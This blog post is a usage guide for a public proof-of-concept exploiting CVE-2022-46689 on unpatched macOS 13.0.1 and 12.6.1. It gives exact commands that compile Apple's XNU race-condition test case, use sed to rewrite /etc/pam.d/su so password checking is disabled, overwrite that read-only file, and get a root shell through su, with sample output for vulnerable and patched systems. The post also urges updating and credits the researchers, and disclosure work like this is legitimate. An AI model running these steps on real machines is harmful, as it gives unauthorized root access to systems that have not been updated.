---
title: Get root on macOS 13.0.1 with CVE-2022-46689, the macOS Dirty Cow bug
categories: macos
permalink: /macdirtycow/
---

Get root on macOS 13.0.1 with [CVE-2022-46689](https://support.apple.com/en-us/HT213532) (macOS equivalent of the Dirty Cow bug), using the testcase extracted from [Apple's XNU source](https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c).

## Usage

On a macOS 13.0.1 / 12.6.1 (or below) machine, clone the extracted test case:

git clone [https://github.com/zhuowei/MacDirtyCowDemo](https://github.com/zhuowei/MacDirtyCowDemo)

Then run:

```
clang -o switcharoo vm_unaligned_copy_switch_race.c
sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
./switcharoo /etc/pam.d/su overwrite_file.bin
su
```

You should get:

```
% ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
RO mapping was modified
% su
sh-3.2# 
```

Tested on macOS 13 beta (22A5266r) with SIP off (it should still work with SIP on).

If your system is fully patched (macOS 13.1 / 12.6.2), it should instead read:

```
$ ./switcharoo /etc/pam.d/su overwrite_file.bin
Testing for 10 seconds...
vm_read_overwrite: KERN_SUCCESS:9865 KERN_PROTECTION_FAILURE:3840 other:0
Ran 13705 times in 10 seconds with no failure
```

and running `su` should still ask for a password.

Thanks to Sealed System Volume, running this on any file on the `/System` volume only modifies the file temporarily: It's reverted on reboot. Running it on a file on a writeable volume will preserve the modification after a reboot.

## Should I be worried?

If you installed the latest macOS update (macOS 13.1 / 12.6.2 / 11.7.2), you should be fine.

If you haven't, do it now.

## Will this be useful for jailbreak?

Probably not.

This - as far as I can tell - affects userspace processes only. Jailbreaks require a kernel exploit. (The Apple Security release notes says that this bug may allow "arbitrary code with kernel privileges", but I can't see how.)

You might still do something cool on iOS with this, but I'm not sure what you'd overwrite: codesigning should protect all executables and libraries. (I have not tested this: let me know if you find anything!)

## Credits

- Ian Beer of [Project Zero](https://googleprojectzero.blogspot.com/) for finding the issue. Looking forward to your [blog post about the XNU memory subsystem](https://bugs.chromium.org/p/project-zero/issues/detail?id=2337#c3)!
- Apple for the [test case](https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c). (I didn't change anything: I just added the command line parameter to control what to overwrite.)
- [SSLab@Gatech](https://gts3.org/assets/papers/2020/jin:pwn2own2020-safari-slides.pdf) for the trick to disable password checking using `/etc/pam.d`.
- [@WangTielei](https://twitter.com/WangTielei/status/1603963997618855937) for sharing a related issue and answering my questions.